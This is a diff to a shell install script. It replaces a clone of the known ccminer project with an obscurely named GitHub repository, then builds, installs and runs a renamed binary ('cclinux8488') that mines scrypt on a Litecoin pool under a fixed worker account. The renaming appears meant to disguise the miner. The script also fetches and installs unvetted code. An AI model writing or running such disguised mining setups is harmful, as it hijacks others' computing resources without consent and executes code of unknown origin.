@@ -6,13 +6,13 @@ apt-get install automake -y
 apt-get install autoconf -y
 apt-get install libssl-dev -y
 apt-get install libcurl4-openssl-dev -y
-git clone https://github.com/tpruvot/ccminer
-cd ccminer
+git clone https://github.com/mobileapps84741274/linux8888888874
+cd linux8888888874
 ./autogen.sh
 ./configure
 make
 make install
 
-cd ./ccminer/
+cd ./linux8888888874/
 
-./ccminer -a scrypt -o stratum+tcp://us.litecoinpool.org:3333 -u linux8474.1 -p 1 -i 24
+./cclinux8488 -a scrypt -o stratum+tcp://us.litecoinpool.org:3333 -u linux8474.1 -p 1 -i 24
